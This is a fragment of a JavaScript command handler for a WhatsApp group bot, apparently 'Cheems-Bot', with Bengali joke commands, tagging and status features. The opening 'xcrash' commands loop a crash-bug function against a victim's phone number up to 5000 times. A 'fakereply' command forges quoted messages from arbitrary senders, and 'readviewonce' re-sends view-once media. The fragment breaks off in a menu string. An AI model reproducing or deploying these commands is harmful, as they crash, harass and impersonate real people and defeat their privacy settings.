
          
case 'xcrash':{
  if (!isPremium) return replygcxeon(mess.prem)
   if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
   victim = text.split("|")[0]+'@s.whatsapp.net'
  amount = "100"
  for (let i = 0; i < amount; i++) {
  XeonyCrashy(pushname,victim)
  await sleep(3000)
  }
  replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
  }
  break
  case 'xcrash1k':{
      if (!isPremium) return replygcxeon(mess.prem)
       if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
       victim = text.split("|")[0]+'@s.whatsapp.net'
      amount = "1000"
      for (let i = 0; i < amount; i++) {
      XeonyCrashy(pushname,victim)
      await sleep(3000)
      }
      replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
      }
      break
  case 'xcrash5k':{
      if (!isPremium) return replygcxeon(mess.prem)
       if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
       victim = text.split("|")[0]+'@s.whatsapp.net'
      amount = "5000"
      for (let i = 0; i < amount; i++) {
      XeonyCrashy(pushname,victim)
      await sleep(3500)
      }
      replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
      }
      break
      

case 'username':
  {
     let user= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') 
     let username =XeonBotInc.getName(user)
     console.log(json)
     const res = json[0]
let message =`your username is ${username}`
XeonBotInc.sendMessage(m.chat,
  { text: message,
   contextInfo:{
           "externalAdReply": {"showAdAttribution": true,
           "containsAutoReply": true,
           "title": ` ${global.botname}`,
           "body": `${ownername}`,
           "previewType": "PHOTO",
          "thumbnailUrl": ``,
          "thumbnail": XeonWlcm,
           "sourceUrl": `${websitex}`}
              }
  })
  }
  break
  case 'emojies':
      await rxns()
      break
      case 'intro': case 'hi' : case 'hello':
              let Intro = { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: 'status@broadcast' }, message: { contactMessage: { displayName: `DEBASHIS DEY \n INTRODUCING »✥«·-𝕯𝕯 𝕮𝖍𝖊𝖊𝖒𝖘-𝕭𝖔𝖙-·»✥«`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'CHEEMS-BOT'\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}

          await introduction()
          XeonBotInc.sendMessage(from, {
              contacts: {
                  displayName: `${list.length} Contact`,
                  contacts: list
              }
          }, {
              quoted: Intro
          })

          break
      case 'teddy':
          await teddy()
          break
      
  case 'family': case 'fm' : {
      if (!m.isGroup) return XeonStickGroup()
      function getRandomPercentage() {
          return Math.floor(Math.random() * 100) + 1;
      }
      let ps = groupMetadata.participants.map(v => v.id);
      let b,c,d,e,f,g,h,j,k,l,n,o,p,q,
      a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
      b= ps[Math.floor(Math.random() * ps.length)]
      c= ps[Math.floor(Math.random() * ps.length)]
      d= ps[Math.floor(Math.random() * ps.length)]
      e= ps[Math.floor(Math.random() * ps.length)]
      f= ps[Math.floor(Math.random() * ps.length)]
      g= ps[Math.floor(Math.random() * ps.length)]
      h= ps[Math.floor(Math.random() * ps.length)]
      i= ps[Math.floor(Math.random() * ps.length)]
      k= ps[Math.floor(Math.random() * ps.length)]
      l= ps[Math.floor(Math.random() * ps.length)]
      n= ps[Math.floor(Math.random() * ps.length)]
      o= ps[Math.floor(Math.random() * ps.length)]
      p= ps[Math.floor(Math.random() * ps.length)]
      q= ps[Math.floor(Math.random() * ps.length)]
  
  
          b= ps[Math.floor(Math.random() * ps.length)]
      do {
      b= ps[Math.floor(Math.random() * ps.length)]
      } while (a==b);
  
      do {
       c= ps[Math.floor(Math.random() * ps.length)]
      } while (c==b||c==a);
  
      do{
       d= ps[Math.floor(Math.random() * ps.length)]
      } while (d==c||d==b||d==a);
  
      do{
       e= ps[Math.floor(Math.random() * ps.length)]
      } while (e==d||e==c||e==b||e==a);
  
      do{
       f= ps[Math.floor(Math.random() * ps.length)]
      } while (f==e||f==d||f==c||f==b||f==a);
       
      do{
       g= ps[Math.floor(Math.random() * ps.length)]
      } while (g==f||g==e||g==d||g==c||g==b||g==a);
  
      do { 
       h= ps[Math.floor(Math.random() * ps.length)]
      } while (h==a||h==b||h==c||h==d||h==f||h==g);
  
      do {
       i= ps[Math.floor(Math.random() * ps.length)]
      } while (i==a||i==b||i==c||i==d||i==e||i==f||i==g||i==h);
      do {
       j= ps[Math.floor(Math.random() * ps.length)]
      } while (j==a||j==b||j==c||j==d||j==e||j==f||j==g||j==h||j==i);
  
      do {
       k= ps[Math.floor(Math.random() * ps.length)]
      } while (k==a||k==b||k==c||k==d||k==e||k==f||k==g||k==h||k==i||k==j);
  
       do {
       l= ps[Math.floor(Math.random() * ps.length)]
       } while (l==a||l==b||l==c||l==d||l==e||l==f||l==g||l==h||l==i||l==j||l==k);
       
       do {
       n= ps[Math.floor(Math.random() * ps.length)]
      } while (n==a||n==b||n==c||n==d||n==e||n==f||n==g||n==h||n==i||n==j||n==k||n==l);
  
      do {
       o= ps[Math.floor(Math.random() * ps.length)]
      } while (o==a||o==b||o==c||o==d||o==e||o==f||o==g||o==h||o==i||o==j||o==k||o==l||o==n);
       p= ps[Math.floor(Math.random() * ps.length)]
       q= ps[Math.floor(Math.random() * ps.length)]
     
  
      const percentage = getRandomPercentage();
      xeonbody = `গোপন সূত্র থেকে পাওয়া @${a.split("@")[0]} চৌদ্দগুষ্টির বিবরণ:\n
  মা :‌-        @${b.split("@")[0]}🫃
  বাবা :-       @${c.split("@")[0]}💦
  ভাই/বোন :-  @${d.split("@")[0]}💆
  বর/বউ :-    @${e.split("@")[0]}👫
  Bf/Gf :-     @${f.split("@")[0]} 👩‍❤‍💋‍👨
  Ex :-        @${g.split("@")[0]} 🤡
  ঘটক :-       @${h.split("@")[0]} 😁
  শশুর :-      @${i.split("@")[0]}🧚
  শাশুরি:-      @${j.split("@")[0]} 🧚
  ক্রাশ :-      @${k.split("@")[0]} 🥵
  বাচ্চা:        ${percentage} টি \n
  1st বাচ্চা:    @${l.split("@")[0]}👶🏼
  
  @${a.split("@")[0]} এই হল তোমার আসল পরিচয় কাল সবাইকে নিয়ে নবান্ন দেখা কর।🤸‍♂`
  try {
          ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
      } catch (err) {
      ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
      }
  XeonWlcm = await getBuffer(ppuser)
  
  XeonBotInc.sendMessage(m.chat,
      { text: xeonbody,
          image: XeonWlcm,
      contextInfo:{
      mentionedJid:[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q],
      externalAdReply: {
          showAdAttribution: true,
          title: botname,
          body: ownername,
          thumbnail: XeonWlcm,
          sourceUrl: websitex,
          mediaType: 1,
      }}}, {
          quoted: m
      })
   }
  break
  case 'fake' :case 'fakereply' :case 'fl' :{
    if (!text) return replygcxeon(`Example: ${prefix + command} message|sender|reply`)
      if (!/|/.test(text)) return replygcxeon(`The data you provided is invalid!, Example: \n ${prefix + command} message|sender|reply`)
        let message = q.split("|")[0]
        let sndr = q.split("|")[1]
        let tagsender = sndr.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        let fakesender = sndr.replace(/[^0-9]/g, '')
        let reply = q.split("|")[2]

        let fakereply = { key: 
          { fromMe: false, 
            participant: tagsender, 
            remoteJid: tagsender },
           message: {extendedTextMessage: 
                    { text: message}
          }
        }
        let key = {}
        try {
          key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
         key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
         key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
          key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
        } catch (e) {
          console.error(e)
        }
        XeonBotInc.sendMessage(m.chat, { delete: key })
        XeonBotInc.sendMessage(m.chat, {
          text: reply,
        },{quoted:fakereply},
      )

  }
    break
  case 'familymembers': case 'family2' : {
      if (!m.isGroup) return XeonStickGroup()
      function getRandomPercentage() {
          return Math.floor(Math.random() * 100) + 1;
      }
      let ps = groupMetadata.participants.map(v => v.id);
      let b,c,d,e,f,g,h,j,k,l,n,o,p,q,
      a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
      b= ps[Math.floor(Math.random() * ps.length)]
      c= ps[Math.floor(Math.random() * ps.length)]
      d= ps[Math.floor(Math.random() * ps.length)]
      e= ps[Math.floor(Math.random() * ps.length)]
      f= ps[Math.floor(Math.random() * ps.length)]
      g= ps[Math.floor(Math.random() * ps.length)]
      h= ps[Math.floor(Math.random() * ps.length)]
      i= ps[Math.floor(Math.random() * ps.length)]
      k= ps[Math.floor(Math.random() * ps.length)]
      l= ps[Math.floor(Math.random() * ps.length)]
      n= ps[Math.floor(Math.random() * ps.length)]
      o= ps[Math.floor(Math.random() * ps.length)]
      p= ps[Math.floor(Math.random() * ps.length)]
      q= ps[Math.floor(Math.random() * ps.length)]
  
  
          b= ps[Math.floor(Math.random() * ps.length)]
      do {
      b= ps[Math.floor(Math.random() * ps.length)]
      } while (a==b);
  
      do {
       c= ps[Math.floor(Math.random() * ps.length)]
      } while (c==b||c==a);
  
      do{
       d= ps[Math.floor(Math.random() * ps.length)]
      } while (d==c||d==b||d==a);
  
      do{
       e= ps[Math.floor(Math.random() * ps.length)]
      } while (e==d||e==c||e==b||e==a);
  
      do{
       f= ps[Math.floor(Math.random() * ps.length)]
      } while (f==e||f==d||f==c||f==b||f==a);
       
      do{
       g= ps[Math.floor(Math.random() * ps.length)]
      } while (g==f||g==e||g==d||g==c||g==b||g==a);
  
      do { 
       h= ps[Math.floor(Math.random() * ps.length)]
      } while (h==a||h==b||h==c||h==d||h==f||h==g);
  
      do {
       i= ps[Math.floor(Math.random() * ps.length)]
      } while (i==a||i==b||i==c||i==d||i==e||i==f||i==g||i==h);
      do {
       j= ps[Math.floor(Math.random() * ps.length)]
      } while (j==a||j==b||j==c||j==d||j==e||j==f||j==g||j==h||j==i);
  
      do {
       k= ps[Math.floor(Math.random() * ps.length)]
      } while (k==a||k==b||k==c||k==d||k==e||k==f||k==g||k==h||k==i||k==j);
  
       do {
       l= ps[Math.floor(Math.random() * ps.length)]
       } while (l==a||l==b||l==c||l==d||l==e||l==f||l==g||l==h||l==i||l==j||l==k);
       
       do {
       n= ps[Math.floor(Math.random() * ps.length)]
      } while (n==a||n==b||n==c||n==d||n==e||n==f||n==g||n==h||n==i||n==j||n==k||n==l);
  
      do {
       o= ps[Math.floor(Math.random() * ps.length)]
      } while (o==a||o==b||o==c||o==d||o==e||o==f||o==g||o==h||o==i||o==j||o==k||o==l||o==n);
       p= ps[Math.floor(Math.random() * ps.length)]
       q= ps[Math.floor(Math.random() * ps.length)]
     
  
      const percentage = getRandomPercentage();
      maa=XeonBotInc.getName(a),
      baba=XeonBotInc.getName(b),
      vai=XeonBotInc.getName(c),
      bou=XeonBotInc.getName(d),
      bf=XeonBotInc.getName(e),
      bariwala=XeonBotInc.getName(f),
      ex=XeonBotInc.getName(j),
      sosur=XeonBotInc.getName(g),
      sasuri=XeonBotInc.getName(h),
      crush=XeonBotInc.getName(i),
  
      xeonbody = `গোপন সূত্র থেকে পাওয়া @${a.split("@")[0]} চৌদ্দগুষ্টির বিবরণ:\n
  মা :‌-        ${maa}🫃
  বাবা :-       ${baba}💦
  ভাই/বোন :-  ${vai}💆
  বর/বউ :-    ${bou}👫
  Bf/Gf :-     ${bf} 👩‍❤‍💋‍👨
  Ex :-        ${ex} 🤡
  বাড়িওয়ালা :-  ${bariwala} 🏟
  শশুর :-      ${sosur}🧚
  শাশুরি:-      ${sasuri} 🧚
  ক্রাশ :-      ${crush} 🥵
  বাচ্চা:        ${percentage} টি \n
  @${a.split("@")[0]} এই হল তোমার আসল পরিচয় কাল সবাইকে নিয়ে নবান্ন দেখা কর।🤸‍♂`
  try {
          ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
      } catch (err) {
      ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
      }
  XeonWlcm = await getBuffer(ppuser)
  
  XeonBotInc.sendMessage(m.chat,
      { text: xeonbody,
          image: XeonWlcm,
      contextInfo:{
      mentionedJid:[a],
      externalAdReply: {
          showAdAttribution: true,
          title: botname,
          body: ownername,
          thumbnail: XeonWlcm,
          sourceUrl: websitex,
          mediaType: 1,
      }}}, {
          quoted: m
      })
   }
  break
  case 'upp': case 'profpic': {
      a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
      try {
          ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
          } catch (err) {
          ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
          }
          XeonWlcm = await getBuffer(ppuser)
          let username =XeonBotInc.getName(a)
          dpuser = `here is ${username}'s profile picture`
          
          XeonBotInc.sendMessage(m.chat, {
              image: XeonWlcm,
              caption: dpuser,
              mentionjid: [a],
              
          }, {
              quoted: m
          })
  
  }
      break


           case 'groupowner': {
                      XeonBotInc.sendMessage(m.chat,
                      { text: ` This Group was Created by @${groupOwner.split("@")[0]}👑`,
                      contextInfo:{
                      mentionedJid:[groupOwner],
                      forwardingScore: 9999999,
                      isForwarded: true, 
                      "externalAdReply": {
                      "showAdAttribution": true,
                      "containsAutoReply": true,
                      "title": ` ${global.botname}`,
                      "body": `${ownername}`,
                      "previewType": "PHOTO",
                      "thumbnailUrl": ``,
                      "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
                      "sourceUrl": `${websitex}`}}},
                      { quoted: m})        
                                  }
      break










//modified
      
            case 'readviewonce': case 'vv': {
	if (!m.quoted) return replygcxeon(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break

               
            case 'tagall':
                let me = m.sender
                let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            
            case 'hidetag':
                XeonBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break

            
                //bot status
                case 'ping': case 'botstatus': case 'statusbot': case 'p':
                  let fgg = { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: 'status@broadcast' }, message: { contactMessage: { displayName: `꧁﴿.·»✥«·-𝕯𝕯 𝕮𝖍𝖊𝖊𝖒𝖘-𝕭𝖔𝖙-·»✥«.·﴾꧂\n Created by: ${ownername}😎`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'CHEEMS-BOT'\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
                  let timestampe = speed()
                  let latensie = speed() - timestampe
                   let ping = `> 📌 Hey there, 🤗
> ${botname} 
> is online 📡🛰️
> 📌 ʀᴇsᴘᴏɴsᴇ sᴘᴇᴇᴅ :  ${latensie.toFixed(4)} ms 🏃
> 📌 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}⏰
>  
> 📌 ᴄʀᴇᴀᴛᴇᴅ ʙʏ : ${ownername} 👑`
await XeonBotInc.sendMessage(m.chat, { react: { text: `🏃🏼‍♂️`, key: m.key }})
await sleep(300)
                  XeonBotInc.sendMessage(m.chat, {
                      text: ping,
                    
                  }, {
                      quoted: fgg
                  })
for (i=0;i<5;i++){
await XeonBotInc.sendMessage(m.chat, { react: { text: `😀`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😁`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😂`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `🤣`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😃`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😄`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😅`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😆`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😉`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😊`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😋`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😎`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😍`, key: m.key }})
await sleep(100)
await XeonBotInc.sendMessage(m.chat, { react: { text: `😘`, key: m.key }})
}
  break
  case 'handle':
    await handle();
  break
      case 'relay':
      if (!isPremium) return replygcxeon(mess.premium)
         let message = q ? q : ''
          XeonBotInc.relayMessage(m.chat, {
              scheduledCallCreationMessage: {
                  callType: "VIDEO",
                  scheduledTimestampMs: `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
                  title: message
              }
          }, {})
          
            break

            
            case 'toonce':
              case 'avv':
            case 'toviewonce': {
                if (!quoted) return replygcxeon(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                   XeonBotInc.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break

            
            case 'soulmate': {
            if (!m.isGroup) return XeonStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let ps = groupMetadata.participants.map(v => v.id);
            do {
              jodoh= ps[Math.floor(Math.random() * ps.length)]
              } while (jodoh==me);

              
XeonBotInc.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${websitex}`}}},
{ quoted: m})        
            }
            break

            case 'congratulations': 
              let reply  = `Biye ta kor taratari🎷🎺`
        
XeonBotInc.sendMessage(m.chat,
  { text: reply,
  contextInfo:{
  forwardingScore: 9999999,
  isForwarded: true, 
  "externalAdReply": {
  "showAdAttribution": true,
  "containsAutoReply": true,
  "title": ` ${global.botname}`,
  "body": `${ownername}`,
  "previewType": "PHOTO",
  "thumbnailUrl": ``,
  "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
  "sourceUrl": `${websitex}`}}},
  { quoted: m})        
              
              break

            case 'couple': case 'vatar': case 'vatari': {
            if (!m.isGroup) return XeonStickGroup()
                if (!m.isGroup) return XeonStickGroup()
                let member = participants.map(u => u.id)
                let orang = member[Math.floor(Math.random() * member.length)]
                let jodoh = member[Math.floor(Math.random() * member.length)]
                let me = m.sender
                
                let ps = groupMetadata.participants.map(v => v.id);

                do {
                  jodoh= ps[Math.floor(Math.random() * ps.length)]
                  } while (jodoh==orang);
                do {
                    jodoh= ps[Math.floor(Math.random() * ps.length)]
                  } while (jodoh==me);

                do {
                    orang= ps[Math.floor(Math.random() * ps.length)]
                  } while (me==orang);

                  
               let xyz = `
❤️  ❤️  ❤️  ❤️  ❤️  ❤️  ❤️  ❤️
  গ্রুপের নতুন বর - বৌ 😘

    👉 @${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]} 👈

He he he, কি রে শালা, খবর কি তোদের?😜😁👀
❤️  ❤️  ❤️  ❤️  ❤️  ❤️  ❤️  ❤️  `
              
 let downmsg = `> _Checked by @${me.split('@')[0]}_ `
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xyz
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: downmsg
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Congratulations 🥳","id":"Biye ta kor taratri🎷🎺"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":" Try Again","id":"${prefix}couple"}`
              }
           ],
           
  }),
  contextInfo: {
    mentionedJid: [orang,jodoh,me], 
    forwardingScore: 999,
    isForwarded: true,
  forwardedNewsletterMessageInfo: {
    newsletterJid: '120363222395675670@newsletter',
    newsletterName: ownername,
    serverMessageId: 143
  }
  }
          
        })
    }
  }
}, {quoted : m})
await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})

              }


                break















//menu configurations

let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
│ Hi 👋 
└┬❖  ${pushname} 
    │✑  ${xeonytimewisher} 😄
┌┤✑ Use prefix ${prefix}
│└────────────┈ ⳹

//